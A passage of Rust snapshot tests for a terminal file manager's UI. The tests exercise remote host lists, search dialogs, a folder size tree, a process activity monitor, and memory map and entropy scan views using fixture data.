            name: "dev@laptop".into(),
            fingerprint: "aabb-ccdd-eeff-0011".into(),
            connections: Some(3),
            key_changed: Some(borg_core::KeyChange { when: "2026-11-09".into(), was: "0102-0304-0506-0708".into() }),
        },
        borg_core::RemoteClient {
            name: "workstation".into(),
            fingerprint: "1122:3344:5566".into(),
            connections: Some(0),
            key_changed: None,
        },
        borg_core::RemoteClient {
            name: "old-host-status".into(),
            fingerprint: "7788:99aa:bbcc".into(),
            connections: None,
            key_changed: None,
        },
    ]));
    let buffer = stage.render(stage.started)?;
    check("remote_colony_clients", &stage, buffer)?;
    stage.send(key(KeyCode::Tab));
    let buffer = stage.render(stage.started)?;
    check("remote_colony_no_outgoing_hosts", &stage, buffer)
}

#[test]
fn remote_mirror_connection_progress_and_failure() -> Result<()> {
    let mut stage = staged(Motion::STILL, QUIET, project(), CLOCK)?;
    stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('h'), KeyModifiers::ALT)));
    stage.send(Msg::RemoteCatalog {
        choices: vec![borg_core::RemoteChoice {
            machine: "production".into(),
            session: Some("default".into()),
            name: "Default".into(),
            ..Default::default()
        }],
        complete: true,
    });
    stage.send(key(KeyCode::Char('m')));
    let buffer = stage.render(stage.started)?;
    check("remote_mirror_connecting", &stage, buffer)?;
    stage.send(Msg::RemoteMirrorConnected(Err(
        "Connection timed out after 10 seconds while loading the remote screen.".into(),
    )));
    let buffer = stage.render(stage.started)?;
    check("remote_mirror_connection_failed", &stage, buffer)
}

#[test]
fn shell_exit_confirmation_defaults_to_keep_running() -> Result<()> {
    let mut stage = staged(Motion::STILL, QUIET, project(), CLOCK)?;
    stage.send(Msg::Signal(borg_term::ShellSignal::ExitRequested { token: "123".into() }));
    let buffer = stage.render(stage.started)?;
    check("shell_exit_confirmation", &stage, buffer)
}

#[test]
fn discovery_mouse_targets_and_tiny_windows() -> Result<()> {
    use borg_core::{Action, Overlay, Pointer};
    use crossterm::event::{MouseButton, MouseEvent, MouseEventKind};
    let mut stage = collected_stage(GridSize { cols: 132, rows: 28 })?;
    let click = |column, row| MouseEvent {
        kind: MouseEventKind::Down(MouseButton::Left),
        column,
        row,
        modifiers: KeyModifiers::NONE,
    };
    let bar = stage.state.layout(stage.started).keybar;
    assert!(matches!(
        borg_ui::mouse_input(&stage.state, click(bar.x, bar.y + 1), false, stage.started),
        Some(Msg::Pointer(Pointer::Action(Action::BrowseRemotes)))
    ));
    stage.send(Msg::Pointer(Pointer::Action(Action::Quit)));
    let buffer = stage.render(stage.started)?;
    let screen = Snapshot::from_buffer(buffer, &stage.palette, None);
    let (x, y) = screen.find("[ No ]").unwrap();
    assert!(matches!(
        borg_ui::mouse_input(&stage.state, click(x, y), false, stage.started),
        Some(Msg::Pointer(Pointer::Confirm(false)))
    ));
    stage.send(key(KeyCode::Esc));
    stage.state.collections.push(borg_core::Collection { name: "Bundle".into(), entries: Vec::new() });
    stage.send(Msg::Pointer(Pointer::Action(Action::OpenCollection)));
    let buffer = stage.render(stage.started)?;
    let screen = Snapshot::from_buffer(buffer, &stage.palette, None);
    let (x, y) = screen.find("F7: New collection").unwrap();
    assert!(matches!(
        borg_ui::mouse_input(&stage.state, click(x, y), false, stage.started),
        Some(Msg::Pointer(Pointer::NewCollection))
    ));
    stage.send(key(KeyCode::Esc));
    for (cols, rows) in [(1, 1), (4, 3), (20, 8), (44, 12), (193, 40)] {
        stage.send(Msg::Resize { cols, rows });
        stage.emulator.resize(GridSize::console(cols, rows));
        stage.send(Msg::Pointer(Pointer::Action(Action::AnalyzeSpace)));
        stage.render(stage.started)?;
        assert!(matches!(stage.state.overlay, Some(Overlay::Search(_))));
        stage.send(key(KeyCode::Esc));
        stage.send(Msg::Pointer(Pointer::Action(Action::OpenCollection)));
        stage.render(stage.started)?;
        stage.send(key(KeyCode::Esc));
        stage.state.overlay = None;
    }
    Ok(())
}

#[test]
fn search_controls_have_distinct_boundaries_and_labels_in_each_theme() -> Result<()> {
    use borg_core::{Action, Pointer};
    for theme in ["neon", "classic", "midnight"] {
        let mut stage = stage(GridSize { cols: 110, rows: 26 }, Motion::STILL)?;
        select_theme(&mut stage, theme);
        stage.send(Msg::Pointer(Pointer::Action(Action::Search)));
        for _ in 0..borg_core::HIDDEN_FIELD {
            stage.send(key(KeyCode::Tab));
        }
        let buffer = stage.render(stage.started)?;
        let screen = Snapshot::from_buffer(buffer.clone(), &stage.palette, None);
        let (x, y) = screen.find("Name or glob").unwrap();
        let row = &screen.lines()[usize::from(y)];
        let field =
            row.chars().enumerate().skip(usize::from(x) + "Name or glob".len()).find(|(_, c)| *c == '[').unwrap().0
                as u16;
        assert_ne!(screen.style_at(x, y).bg, screen.style_at(field + 2, y).bg, "{theme}: field blends into label");
        assert!(row.chars().skip(usize::from(field)).any(|c| c == ']'));
        assert!(!screen.contains("guaranteed freed space"));
        assert!(!screen.contains("Folder totals find"));
        assert!(!screen.contains("folder totals only"));
        check(&format!("search_fields_{theme}"), &stage, buffer)?;
        let (x, y) = screen.find("[ Enter: Search ]").unwrap();
        let event = crossterm::event::MouseEvent {
            kind: crossterm::event::MouseEventKind::Down(crossterm::event::MouseButton::Left),
            column: x,
            row: y,
            modifiers: KeyModifiers::NONE,
        };
        let hit = borg_ui::mouse_input(&stage.state, event, false, stage.started).unwrap();
        assert!(matches!(hit, Msg::Pointer(Pointer::SearchStart)));
        stage.send(hit);
        assert!(stage.state.overlay.is_none());
        assert!(stage.state.active_panel().is_results());
    }
    Ok(())
}

#[test]
fn recent_searches_are_listed_under_the_form_marked_while_recalled_and_taken_with_a_click() -> Result<()> {
    use borg_core::{Action, Overlay, PastSearch, Pointer, SearchHistory};
    use crossterm::event::{MouseButton, MouseEvent, MouseEventKind};
    let mut stage = stage(GridSize { cols: 110, rows: 30 }, Motion::STILL)?;
    let past = |query: &str, root: &str| PastSearch { query: query.into(), root: root.into() };
    stage.state.search_history = SearchHistory::new(vec![
        past("*регламент*", "/home/me/projects/borg"),
        past("ext:rs -test", "/home/me/projects/borg"),
        past("invoice size:>1m", "/home/me/Documents"),
        past("type:image mod:<7d", "/"),
    ]);
    stage.send(Msg::Pointer(Pointer::Action(Action::Search)));
    stage.send(ctrl('p'));
    stage.send(ctrl('p'));
    let buffer = stage.render(stage.started)?;
    let screen = Snapshot::from_buffer(buffer.clone(), &stage.palette, None);
    assert!(screen.contains("Recent searches"));
    assert!(screen.contains("invoice size:>1m  in ~/Documents"));
    assert!(screen.contains("type:image mod:<7d  in /"));
    let (x, y) = screen.find("invoice size").unwrap();
    assert_ne!(screen.style_at(x, y - 1).bg, screen.style_at(x, y).bg, "the recalled search is marked");
    check("search_recent", &stage, buffer)?;
    let (x, y) = screen.find("invoice size").unwrap();
    let click =
        MouseEvent { kind: MouseEventKind::Down(MouseButton::Left), column: x, row: y, modifiers: KeyModifiers::NONE };
    let hit = borg_ui::mouse_input(&stage.state, click, false, stage.started).unwrap();
    assert!(matches!(hit, Msg::Pointer(Pointer::SearchRecent(2))));
    stage.send(hit);
    let Some(Overlay::Search(form)) = &stage.state.overlay else { panic!("the search window stays open") };
    assert_eq!(form.pattern.text(), "invoice size:>1m");
    Ok(())
}

#[test]
fn what_searches_leave_out_opens_from_the_search_dialog_and_is_edited_with_keys_and_clicks() -> Result<()> {
    use borg_core::{Action, Overlay, Pointer};
    use crossterm::event::{MouseButton, MouseEvent, MouseEventKind};
    let mut stage = stage(GridSize { cols: 110, rows: 30 }, Motion::STILL)?;
    stage.state.settings.search.exclude = vec!["*.min.js".into()];
    stage.send(Msg::Pointer(Pointer::Action(Action::Search)));
    let click = |screen: &Snapshot, text: &str| {
        let (column, row) =
            screen.find(text).unwrap_or_else(|| panic!("{text} on screen\n{}", screen.lines().join("\n")));
        MouseEvent { kind: MouseEventKind::Down(MouseButton::Left), column, row, modifiers: KeyModifiers::NONE }
    };
    let screen = Snapshot::from_buffer(stage.render(stage.started)?, &stage.palette, None);
    let hit = borg_ui::mouse_input(&stage.state, click(&screen, "F4 Edit"), false, stage.started).unwrap();
    assert!(matches!(hit, Msg::Pointer(Pointer::EditExclusions)));
    stage.send(hit);
    let screen = Snapshot::from_buffer(stage.render(stage.started)?, &stage.palette, None);
    for text in ["Leave out of searches", "[x] Generated folders", "[x] What .gitignore", "*.min.js", "+ Add a pattern"]
    {
        assert!(screen.contains(text), "{text} missing\n{}", screen.lines().join("\n"));
    }
    let hit = borg_ui::mouse_input(&stage.state, click(&screen, "+ Add a pattern"), false, stage.started).unwrap();
    assert!(matches!(hit, Msg::Pointer(Pointer::Exclusion(3))));
    stage.send(hit);
    for c in "Library/Caches/".chars() {
        stage.send(key(KeyCode::Char(c)));
    }
    stage.send(key(KeyCode::Enter));
    assert_eq!(stage.state.settings.search.exclude, ["*.min.js", "Library/Caches/"]);
    let screen = Snapshot::from_buffer(stage.render(stage.started)?, &stage.palette, None);
    let hit = borg_ui::mouse_input(&stage.state, click(&screen, "[x] What"), false, stage.started).unwrap();
    stage.send(hit);
    assert!(!stage.state.settings.search.ignore_files);
    stage.send(key(KeyCode::Esc));
    assert!(matches!(stage.state.overlay, Some(Overlay::Search(_))));
    Ok(())
}

#[test]
fn two_row_footer_keeps_actions_visible_and_mouse_targets_on_their_rows() -> Result<()> {
    use borg_core::{Action, Pointer};
    use crossterm::event::{MouseButton, MouseEvent, MouseEventKind};
    let mut stage = stage(GridSize { cols: 132, rows: 28 }, Motion::STILL)?;
    let footer = stage.state.layout(stage.started).keybar;
    let click = |column, row| MouseEvent {
        kind: MouseEventKind::Down(MouseButton::Left),
        column,
        row,
        modifiers: KeyModifiers::NONE,
    };
    let buffer = stage.render(stage.started)?;
    let screen = Snapshot::from_buffer(buffer.clone(), &stage.palette, None);
    assert_eq!(footer.height, 2);
    assert_eq!(footer.bottom(), stage.state.rows);
    assert!(screen.lines()[usize::from(footer.y)].contains("F1Help"));
    assert!(screen.lines()[usize::from(footer.y + 1)].starts_with("Alt-H Remote hosts"));
    assert!(!screen.lines()[0].contains("Ctrl-F Search"));
    let (x, y) = screen.find("Ctrl-F Search").unwrap();
    assert!(matches!(
        borg_ui::mouse_input(&stage.state, click(x, y), false, stage.started),
        Some(Msg::Pointer(Pointer::Action(Action::Search)))
    ));
    check("two_row_shortcuts", &stage, buffer)?;
    stage.state.notice = Some("Copied 1 file".into());
    let buffer = stage.render(stage.started)?;
    let screen = Snapshot::from_buffer(buffer.clone(), &stage.palette, None);
    let notice = &screen.lines()[usize::from(footer.y + 1)];
    assert_eq!(notice.split("◈ Borg Commander").next().unwrap().trim(), "Copied 1 file");
    let (x, y) = screen.find("F10Quit").unwrap();
    assert!(matches!(
        borg_ui::mouse_input(&stage.state, click(x, y), false, stage.started),
        Some(Msg::Pointer(Pointer::Action(Action::Quit)))
    ));
    assert!(matches!(
        borg_ui::mouse_input(&stage.state, click(footer.x, footer.y + 1), false, stage.started),
        Some(Msg::Pointer(Pointer::DismissNotice))
    ));
    check("two_row_shortcuts_notice", &stage, buffer)
}

#[test]
fn result_title_controls_maximize_restore_and_fold_the_clicked_pane() -> Result<()> {
    use borg_core::{Action, Pointer, Side};
    use crossterm::event::{MouseButton, MouseEvent, MouseEventKind};
    let mut stage = collected_stage(GridSize { cols: 132, rows: 28 })?;
    let click = |column, row| MouseEvent {
        kind: MouseEventKind::Down(MouseButton::Left),
        column,
        row,
        modifiers: KeyModifiers::NONE,
    };
    let path = stage.state.active_panel().hovered_entry().unwrap().identity().to_path_buf();
    let buffer = stage.render(stage.started)?;
    let screen = Snapshot::from_buffer(buffer.clone(), &stage.palette, None);
    assert!(stage.state.layout(stage.started).panels.iter().all(|rect| !rect.is_empty()));
    let (x, y) = screen.find("[+]").unwrap();
    let hit = borg_ui::mouse_input(&stage.state, click(x, y), false, stage.started).unwrap();
    assert!(matches!(
        hit,
        Msg::Pointer(Pointer::ResultControl { side: Side::Left, action: Action::SetExpanded(true) })
    ));
    check("results_default_pane", &stage, buffer)?;
    stage.send(hit);
    let buffer = stage.render(stage.started)?;
    let screen = Snapshot::from_buffer(buffer.clone(), &stage.palette, None);
    assert!(stage.state.layout(stage.started).panels[1].is_empty());
    let (x, y) = screen.find("[=]").unwrap();
    let restore = borg_ui::mouse_input(&stage.state, click(x, y), false, stage.started).unwrap();
    check("results_maximized_controls", &stage, buffer)?;
    stage.send(restore);
    assert!(!stage.state.layout(stage.started).panels[1].is_empty());
    stage.state.active = Side::Right;
    let buffer = stage.render(stage.started)?;
    let screen = Snapshot::from_buffer(buffer, &stage.palette, None);
    let (x, y) = screen.find("[-]").unwrap();
    let hit = borg_ui::mouse_input(&stage.state, click(x, y), false, stage.started).unwrap();
    stage.send(hit);
    assert_eq!(stage.state.active, Side::Left);
    assert!(!stage.state.active_panel().is_results());
    stage.send(Msg::Pointer(Pointer::Action(Action::BackResults)));
    assert!(stage.state.active_panel().is_results());
    assert_eq!(stage.state.active_panel().hovered_entry().unwrap().identity(), path);
    assert_eq!(stage.state.active_panel().marked_count(), 1);
    Ok(())
}

fn size_tree_stage() -> Result<Stage> {
    use borg_core::{ResultSource, SearchKind, SearchOptions, SearchProgress, SearchRequest, Sort, SortKey};
    let mut stage = stage(GridSize { cols: 132, rows: 28 }, Motion::STILL)?;
    stage.state.settings.preferences.nerd_font = true;
    let theme = stage.state.appearance.choices().iter().position(|c| c.id == "neon").unwrap();
    stage.state.appearance.select(theme, stage.started, Duration::ZERO);
    let entries = [
        ("/workspace/project", 6_301_000_000, 84_310, true),
        ("/workspace/project/target", 4_600_000_000, 51_200, false),
        ("/workspace/project/target/debug", 4_200_000_000, 48_000, false),
        ("/workspace/project/target/debug/deps", 3_100_000_000, 30_000, false),
        ("/workspace/project/target/release", 400_000_000, 3_200, false),
        ("/workspace/project/assets", 1_700_000_000, 33_000, true),
        ("/workspace/project/src", 1_000_000, 110, false),
    ]
    .into_iter()
    .map(|(path, bytes, files, partial)| {
        let path = PathBuf::from(path);
        let mut e = entry(path.file_name().unwrap().to_str().unwrap(), EntryKind::Dir, bytes, RECENT, false);
        e.source = Some(path);
        let folders = match e.identity().to_str().unwrap() {
            "/workspace/project" => 6,
            "/workspace/project/target" => 3,
            "/workspace/project/target/debug" => 1,
            _ => 0,
        };
        e.usage = Some(borg_vfs::FolderUsage {
            files,
            folders,
            partial,
            measured: at(RECENT),
            direct_files: if e.identity().ends_with("debug") { 18_000 } else { 0 },
            direct_bytes: if e.identity().ends_with("debug") { 1_100_000_000 } else { 0 },
            ..Default::default()
        });
        e
    })
    .collect();
    stage.state.panels[0].open_results(
        ResultSource::Search {
            request: SearchRequest {
                skip: None,
                root: "/workspace/project".into(),
                query: "*".into(),
                hidden: true,
                options: SearchOptions { kind: SearchKind::FolderTree, ..Default::default() },
            },
            progress: Box::new(SearchProgress {
                measured: at(RECENT),
                visited: 84_422,
                errors: 1,
                ..Default::default()
            }),
        },
        entries,
        80,
    );
    stage.state.panels[0].set_sort(Sort { key: SortKey::Size, reverse: true });
    stage.state.panels[0].move_by(1);
    stage.send(key(KeyCode::Right));
    Ok(stage)
}

#[test]
fn size_tree_fresh_cached_filtered_and_narrow() -> Result<()> {
    let mut stage = size_tree_stage()?;
    let buffer = stage.render(stage.started)?;
    check("size_tree", &stage, buffer)?;
    stage.state.panels[0].cache_observations();
    stage.send(key(KeyCode::Right)).send(key(KeyCode::Right));
    stage.send(key(KeyCode::Insert)).send(key(KeyCode::Left)).send(key(KeyCode::Left));
    let buffer = stage.render(stage.started)?;
    check("size_tree_cached", &stage, buffer)?;
    stage.state.panels[0].filter_results("deps".into());
    let buffer = stage.render(stage.started)?;
    check("size_tree_filtered", &stage, buffer)?;
    stage.state.panels[0].filter_results(String::new());
    stage.send(Msg::Resize { cols: 44, rows: 12 });
    let buffer = stage.render(stage.started)?;
    check("size_tree_narrow", &stage, buffer)?;
    for (cols, rows) in [(0, 0), (1, 1), (8, 4), (20, 6), (193, 40)] {
        stage.send(Msg::Resize { cols, rows });
        stage.render(stage.started)?;
    }
    Ok(())
}

#[test]
fn size_tree_arrows_and_column_headers_share_mouse_geometry() -> Result<()> {
    use borg_core::{Pointer, Side, SortKey};
    use crossterm::event::{MouseButton, MouseEvent, MouseEventKind};
    let mut stage = size_tree_stage()?;
    let buffer = stage.render(stage.started)?;
    let row = (0..buffer.area.height)
        .find(|&y| (0..buffer.area.width).any(|x| buffer[(x, y)].symbol() == "▾" && x > 4))
        .unwrap();
    let column = (3..buffer.area.width).find(|&x| buffer[(x, row)].symbol() == "▾").unwrap();
    let event =
        MouseEvent { kind: MouseEventKind::Down(MouseButton::Left), column, row, modifiers: KeyModifiers::NONE };
    let message = borg_ui::mouse_input(&stage.state, event, false, stage.started).unwrap();
    assert!(matches!(message, Msg::Pointer(Pointer::TreeNode { side: Side::Left, index: 1 })));
    stage.send(message);
    assert_eq!(stage.state.panels[0].len(), 4);
    let row =
        (0..buffer.area.height).find(|&y| (0..buffer.area.width).any(|x| buffer[(x, y)].symbol() == "↓")).unwrap();
    let column = (0..buffer.area.width).find(|&x| buffer[(x, row)].symbol() == "↓").unwrap();
    let message =
        borg_ui::mouse_input(&stage.state, MouseEvent { column, row, ..event }, false, stage.started).unwrap();
    assert!(matches!(message, Msg::Pointer(Pointer::ResultSort { side: Side::Left, key: SortKey::Size })));
    Ok(())
}

#[test]
fn size_tree_loading_and_cached_folder_listing() -> Result<()> {
    use borg_core::{ListingMode, Panel, ResultSource, SearchProgress, Side};
    let mut stage = size_tree_stage()?;
    let mut root = stage.state.panels[0]
        .entries()
        .iter()
        .find(|e| e.identity() == std::path::Path::new("/workspace/project"))
        .unwrap()
        .clone();
    root.usage = None;
    let ResultSource::Search { request, .. } = stage.state.panels[0].results.as_ref().unwrap().source.clone() else {
        unreachable!()
    };
    stage.state.panels[0].open_results(
        ResultSource::Search { request, progress: Box::new(SearchProgress { visited: 100, ..Default::default() }) },
        vec![root],
        81,
    );
    stage.state.panels[0].begin_search(81);
    let buffer = stage.render(stage.started)?;
    check("size_tree_loading", &stage, buffer)?;
    let mut entries = project();
    entries[0].size = 2_000_000;
    entries[0].usage = Some(borg_vfs::FolderUsage {
        files: 120,
        folders: 8,
        cached: true,
        measured: at(RECENT),
        ..Default::default()
    });
    stage.state.panels[0] = Panel::new("/home/me/projects/borg".into(), 20, ListingMode::Full, Default::default());
    let generation = stage.state.panels[0].generation();
    stage.send(Msg::Batch { side: Side::Left, generation, entries });
    stage.send(Msg::Listed { side: Side::Left, generation, error: None });
    stage.send(key(KeyCode::Down)).send(key(KeyCode::Down));
    let buffer = stage.render(stage.started)?;
    check("folder_sizes_cached_listing", &stage, buffer)
}

fn activity_stage() -> Result<Stage> {
    use borg_core::{ActivityData, ActivityRequest, ProcessInfo, ProcessKey, SystemSample};
    let mut stage = stage(GridSize { cols: 132, rows: 34 }, Motion::STILL)?;
    let theme = stage.state.appearance.choices().iter().position(|c| c.id == "neon").unwrap();
    stage.state.appearance.select(theme, stage.started, Duration::ZERO);
    stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('m'), KeyModifiers::ALT)));
    let base = [
        (410, "compiler", 2_600_000_000, 32000, None),
        (411, "language-server", 812_000_000, 8400, Some(410)),
        (412, "database", 644_000_000, 1100, None),
        (413, "borg", 42_000_000, 120, None),
        (414, "shell", 8_000_000, 0, Some(413)),
    ];
    for tick in 0..10 {
        let id = stage.state.activity.pending.as_ref().unwrap().0;
        let processes = base
            .iter()
            .map(|&(pid, name, ram, cpu, parent)| ProcessInfo {
                key: ProcessKey { pid, start: 100 },
                name: name.into(),
                parent,
                executable: Some(format!("/usr/local/bin/{name}").into()),
                resident: Some(ram + tick * 8_000_000),
                virtual_bytes: Some(ram * 3),
                cpu: Some(cpu),
                read: Some(1_200_000),
                written: Some(64_000),
                protection: None,
                nice: Some(if name == "database" { 5 } else { 0 }),
                stopped: false,
            })
            .collect();
        stage.send(Msg::Activity {
            id,
            result: Ok(ActivityData::Sample(SystemSample {
                processes,
                total: 32_000_000_000,
                used: 18_000_000_000,
                swap_total: 4_000_000_000,
                swap_used: 256_000_000,
                cpu: vec![7500, 4400, 2100, 1200],
                administrator: false,
                own: Some(413),
            })),
        });
        if tick < 9 {
            let next = stage.state.activity.pending.as_ref().map(|p| p.0).unwrap_or(id + 1);
            stage.state.activity.pending = Some((next, ActivityRequest::Sample));
        }
    }
    Ok(stage)
}

#[test]
fn activity_hides_idle_processes_and_says_how_many() -> Result<()> {
    let mut stage = activity_stage()?;
    stage.send(key(KeyCode::Char('c'))).send(key(KeyCode::Char('h')));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "1 idle hidden")?;
    ensure_text(&buffer, "H Show idle")?;
    check("activity_idle_hidden", &stage, buffer)?;
    stage.send(key(KeyCode::Char('/'))).send(key(KeyCode::Char('s'))).send(key(KeyCode::Enter));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "2 of 5")?;
    check("activity_idle_hidden_filtered", &stage, buffer)
}

#[test]
fn activity_signal_dialog_lists_signals_and_priority_steps() -> Result<()> {
    use borg_core::{ActivityRequest, ProcessControl, ProcessSignal};
    let mut stage = activity_stage()?;
    stage.send(key(KeyCode::Char('k')));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Signal or priority")?;
    ensure_text(&buffer, "nice 0 to 5")?;
    check("activity_signal_dialog", &stage, buffer)?;
    stage.send(key(KeyCode::Char('k')));
    assert!(stage.state.overlay.is_none());
    assert!(matches!(
        stage.state.activity.pending,
        Some((_, ActivityRequest::Control { control: ProcessControl::Signal(ProcessSignal::Kill), admin: false, .. }))
    ));
    Ok(())
}

#[test]
fn entropy_scan_ranks_packed_code_first_and_details_the_selected_hit() -> Result<()> {
    use borg_core::{EntropyHit, EntropyReport, HitKind, MemoryRegion, ProcessKey};
    use borg_view::entropy::{Entropy, Tally};
    let mut stage = activity_stage()?;
    stage.send(key(KeyCode::Char('e')));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "All memory of all processes")?;
    check("entropy_scan_dialog", &stage, buffer)?;
    stage.send(key(KeyCode::Char('c')));
    let id = stage.state.activity.entropy.as_ref().unwrap().id;

    let dense = Entropy::of(&(0..=255u8).cycle().take(4096).collect::<Vec<_>>());
    let hit = |pid: u32, name: &str, region: MemoryRegion, high: u32, highest: Entropy| EntropyHit {
        process: ProcessKey { pid, start: 100 },
        name: name.into(),
        kind: HitKind::of(&region),
        tally: Tally { blocks: 40, high, highest, first_high: Some(region.start + 0x3000) },
        region,
    };
    let region = |start: u64, size: u64, permissions: &str, name: &str, path: Option<&str>| MemoryRegion {
        start,
        end: start + size,
        permissions: permissions.into(),
        name: path.map_or_else(|| name.into(), |path| format!("{name} · {path}")),
        path: path.map(String::from),
        dirty: Some(if permissions.contains('w') { 4096 } else { 0 }),
        ..Default::default()
    };
    let hits = vec![
        hit(412, "database", region(0x7f10_0000, 0x10_0000, "rw-", "MALLOC_LARGE", None), 31, dense),
        hit(
            411,
            "language-server",
            region(0x1_0000_0000, 0x80_0000, "r-x", "__TEXT", Some("/usr/local/bin/language-server")),
            3,
            Entropy::HIGH,
        ),
        hit(
            410,
            "compiler",
            region(0x1_2000_0000, 0x40_0000, "r-x", "__TEXT", Some("/usr/local/bin/compiler")),
            38,
            dense,
        ),
        hit(
            410,
            "compiler",
            region(0x2_0000_0000, 0x20_0000, "r--", "mapped file", Some("/usr/local/share/compiler/fonts.pak")),
            40,
            dense,
        ),
    ];
    let first = EntropyReport { hits, scanned: 3, ..Default::default() };
    stage.send(Msg::EntropyScan { id, found: Ok(first), done: false });
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "scanning · Ctrl-C stop · 3 of 5 processes · 4 hits")?;
    ensure_text(&buffer, "Most of this code is as dense")?;
    check("entropy_scan_running", &stage, buffer)?;

    let shell = ProcessKey { pid: 414, start: 100 };
    let last = EntropyReport {
        scanned: 0,
        unreadable: vec![shell],
        remaining: vec![ProcessKey { pid: 413, start: 100 }],
        ..Default::default()
    };
    stage.send(Msg::EntropyScan { id, found: Ok(last), done: true });
    stage.send(key(KeyCode::Down)).send(key(KeyCode::Down)).send(key(KeyCode::Down));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "1 unreadable · 0 protected · 1 not reached")?;
    ensure_text(&buffer, "N Continue")?;
    ensure_text(&buffer, "A Administrator")?;
    check("entropy_scan_results", &stage, buffer)?;
    Ok(())
}

#[test]
fn activity_process_memory_map_snapshots_and_permissions() -> Result<()> {
    use borg_core::{ActivityData, ActivityPage, ActivityRequest, MemoryRegion, MemorySnapshot};
    let mut stage = activity_stage()?;
    let buffer = stage.render(stage.started)?;
    let event = crossterm::event::MouseEvent {
        column: 2,
        row: 0,
        kind: crossterm::event::MouseEventKind::Down(crossterm::event::MouseButton::Left),
        modifiers: KeyModifiers::NONE,
    };
    let msg = borg_ui::mouse_input(&stage.state, event, false, stage.started).unwrap();
    assert!(matches!(
        msg,
        Msg::Pointer(borg_core::Pointer::Action(borg_core::Action::OpenMenuBar) | borg_core::Pointer::Menu(_))
    ));
    check("activity_processes", &stage, buffer)?;
    stage.send(key(KeyCode::Char('/'))).send(key(KeyCode::Char('o')));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Esc clear")?;
    check("activity_filter_typing", &stage, buffer)?;
    stage.send(key(KeyCode::Enter));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "/ edit")?;
    check("activity_filter_applied", &stage, buffer)?;
    stage.send(key(KeyCode::Esc));
    stage.send(key(KeyCode::Tab));
    let buffer = stage.render(stage.started)?;
    check("activity_memory", &stage, buffer)?;
    let neon = stage.state.appearance.current();
    let ember = stage.state.appearance.choices().iter().position(|c| c.id == "ember").unwrap();
    stage.state.appearance.select(ember, stage.started, Duration::ZERO);
    let buffer = stage.render(stage.started)?;
    check("activity_memory_ember", &stage, buffer)?;
    stage.state.appearance.select(neon, stage.started, Duration::ZERO);
    stage.send(key(KeyCode::Enter));
    let id = stage.state.activity.pending.as_ref().unwrap().0;
    let process = stage.state.activity.selected.unwrap();
    let region = MemoryRegion {
        start: 0x100000000,
        end: 0x100040000,
        permissions: "rw-".into(),
        name: "Heap · application buffers".into(),
        resident: Some(163840),
        private: Some(163840),
        shared: Some(0),
        swap: Some(0),
        ..Default::default()
    };
    let mapped =
        |start: u64, size: u64, permissions: &str, kind: &str, path: Option<&str>, resident, dirty| MemoryRegion {
            start,
            end: start + size,
            permissions: permissions.into(),
            name: path.map_or(kind.into(), |p| format!("{kind} · {p}")),
            resident: Some(resident),
            swap: Some(0),
            dirty: Some(dirty),
            path: path.map(Into::into),
            ..Default::default()
        };
    let libsystem = Some("/usr/lib/libSystem.B.dylib");
    stage.send(Msg::Activity {
        id,
        result: Ok(ActivityData::Regions(vec![
            region.clone(),
            mapped(0x100040000, 0x400000, "rw-", "MALLOC_SMALL · DefaultMallocZone", None, 98304, 65536),
            mapped(0x100440000, 0x40000, "r-x", "__TEXT", Some("/usr/local/bin/compiler"), 131072, 0),
            mapped(0x100480000, 0x8000, "rw-", "__DATA", Some("/usr/local/bin/compiler"), 32768, 16384),
            mapped(0x16f000000, 0x800000, "rw-", "Stack · thread 0", None, 131072, 131072),
            mapped(0x16f800000, 0x4000, "---", "STACK GUARD · stack guard for thread 1", None, 0, 0),
            mapped(0x180000000, 0x400000, "r-x", "__TEXT", libsystem, 2097152, 0),
            mapped(0x180400000, 0x10000, "rw-", "__DATA", libsystem, 65536, 16384),
            mapped(0x180500000, 0x80000, "r-x", "__TEXT", Some("/usr/lib/libobjc.A.dylib"), 524288, 0),
            mapped(0x190000000, 0x40000000, "r--", "mapped file", Some("/System/Library/Fonts/SFNS.ttf"), 1048576, 0),
        ])),
    });
    let buffer = stage.render(stage.started)?;
    check("activity_map", &stage, buffer)?;
    let neon = stage.state.appearance.current();
    let classic = stage.state.appearance.choices().iter().position(|c| c.id == "classic").unwrap();
    stage.state.appearance.select(classic, stage.started, Duration::ZERO);
    let buffer = stage.render(stage.started)?;
    check("activity_map_classic", &stage, buffer)?;
    stage.state.appearance.select(neon, stage.started, Duration::ZERO);
    for code in [KeyCode::Down, KeyCode::Down, KeyCode::Right] {
        stage.send(key(code));
    }
    let buffer = stage.render(stage.started)?;
    check("activity_map_libraries", &stage, buffer)?;
    for code in [KeyCode::Left, KeyCode::Left, KeyCode::Home] {
        stage.send(key(code));
    }
    stage.send(key(KeyCode::Enter));
    stage.send(key(KeyCode::Enter));
    let id = stage.state.activity.pending.as_ref().unwrap().0;
    let bytes = b"Borg Commander\0user preferences\0theme=neon\n".repeat(16);
    stage.send(Msg::Activity {
        id,
        result: Ok(ActivityData::Snapshot(MemorySnapshot {
            process,
            address: region.start,
            bytes: bytes.clone(),
            captured: 123,
        })),
    });
    let buffer = stage.render(stage.started)?;
    check("activity_hex", &stage, buffer)?;
    stage.send(key(KeyCode::Char('h')));
    let buffer = stage.render(stage.started)?;
    check("activity_text", &stage, buffer)?;
    stage.send(key(KeyCode::Char('h'))).send(key(KeyCode::Char('r')));
    let id = stage.state.activity.pending.as_ref().unwrap().0;
    let mut changed = bytes;
    changed[5..14].copy_from_slice(b"Changed!!");
    stage.send(Msg::Activity {
        id,
        result: Ok(ActivityData::Snapshot(MemorySnapshot {
            process,
            address: region.start,
            bytes: changed,
            captured: 124,
        })),
    });
    stage.send(key(KeyCode::Char('d')));
    let buffer = stage.render(stage.started)?;
    check("activity_diff", &stage, buffer)?;
    stage.send(key(KeyCode::Esc));
    stage.state.activity.pending = Some((100, ActivityRequest::Regions { process, admin: false }));
    stage.send(Msg::Activity { id: 100, result: Err("Process protected by macOS".into()) });
    let buffer = stage.render(stage.started)?;
    check("activity_protected", &stage, buffer)?;
